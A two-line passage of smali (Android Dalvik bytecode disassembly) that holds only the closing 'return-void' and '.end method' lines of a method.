    return-void
.end method
